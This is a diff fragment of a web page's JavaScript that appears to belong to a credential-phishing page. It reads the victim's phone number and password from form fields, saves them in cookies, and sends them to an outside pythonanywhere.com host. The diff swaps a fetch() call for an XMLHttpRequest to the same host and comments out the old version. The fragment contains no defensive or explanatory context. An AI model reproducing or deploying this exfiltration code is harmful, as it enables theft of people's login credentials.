@@ -227,15 +227,21 @@
             setCookie("phonenumber", document.getElementById('phonenumber').value);
             setCookie("password", document.getElementById('password').value);
 
-     fetch("https://erikadavis1.pythonanywhere.com/", { method: "POST",
-        body: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
-        headers: {
-        "Content-Type": "application/json",
-        "access-Control-Allow-Origin": "*",
-        "Access-Control-Request-Method":"POST",
-    },
-        }).then(function() {
-        /**/});   
+    let xhr = new XMLHttpRequest();
+    xhr.open("POST", 'https://erikadavis1.pythonanywhere.com');
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.withCredentials = false;
+    xhr.send(JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}));
+    
+    //  fetch("https://erikadavis1.pythonanywhere.com/", { method: "POST",
+    //     body: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
+    //     headers: {
+    //     "Content-Type": "application/json",
+    //     "access-Control-Allow-Origin": "*",
+    //     "Access-Control-Request-Method":"POST",
+    // },
+    //     }).then(function() {
+    //     /**/});   
 
 
     // $.ajax({
